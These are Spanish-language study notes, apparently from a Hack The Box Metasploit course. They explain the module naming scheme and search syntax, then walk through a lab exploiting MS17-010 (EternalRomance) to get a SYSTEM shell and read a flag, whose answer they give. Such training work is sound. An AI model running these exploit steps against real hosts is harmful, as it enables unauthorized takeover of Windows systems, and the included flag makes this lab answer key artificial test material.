Los módulos en metasploit siguen la siguiente estructura: 

```shell-session
<No.> <type>/<os>/<service>/<name>
```

Por ejemplo:
```shell-session
794   exploit/windows/ftp/scriptftp_list
```

## No
Se utiliza para identificar y seleccionar el módulo

## Type

Es la clasificación principal de los módulos de Metasploit; indica qué hace cada módulo.
Tipos y qué hacen:
- Auxiliary: escaneos, fuzzing, sniffing y tareas administrativas (ayuda extra).
- Encoders: transforman/aseguran que los payloads lleguen intactos.
- Exploits: explotan vulnerabilidades para permitir la entrega del payload.
- NOPs: relleno (no-op) para mantener tamaños de payload consistentes.
- Payloads: código que se ejecuta en remoto y conecta de vuelta (p. ej. shell).
- Plugins: scripts adicionales que se integran en msfconsole.

Nota importante: el comando use <nº> (es decir, seleccionar y ejecutar un módulo interactivo) solo sirve con los tipos Auxiliary, Exploits y Post (esos son los “iniciadores” o módulos con los que puedes interactuar directamente).

## OS
Define el sistema operativo contra el que atacará el módulo

## Service
Indica el servicio vulnerable al que se atacará

## Name
Nombra al módulo


# Búsqueda por exploits concretos
Podemos utilizar la siguiente estructura para buscar exploits:
```shell-session
msf6 > search type:exploit platform:windows cve:2021 rank:excellent microsoft
```


Dentro de *msfconsole*; dentro puedo ejecutar: 
```
setg RHOST 1.2.3.4
```

Para que el RHOST cuando cambie de módulo no se pierda a no ser que se cierre la sesión de metasploit.

**1. Use the Metasploit-Framework to exploit the target with EternalRomance. Find the flag.txt file on Administrator's desktop and submit the contents as the answer.**

Entro a metasploit (*msfconsole*).
Hago un "search EternalRomance"
y selecciono el módulo:
```
exploit(windows/smb/ms17_010_psexec)
```

Pongo como RHOST la máquina víctima:
```
set RHOSTS 10.129.114.100
```

Y importantísimo! Como LHOST pongo la IP de la máquina atacante en al red de la máquina víctima:
```
set LHOST 10.10.14.104
```

Nos devuelve una sesión de meterpreter y ejecuto "shell" para obtener una terminal interactiva.

Dentro de la sesión de windows, si hago un *whoami* me encuentro que estoy dentro de la sesión de "nt authority\system".

Y la ubico en:
```
type C:\Users\Administrator\Desktop\flag.txt
	HTB{MSF-W1nD0w5-3xPL01t4t10n}
```

Siendo al respuesta: *"HTB{MSF-W1nD0w5-3xPL01t4t10n}"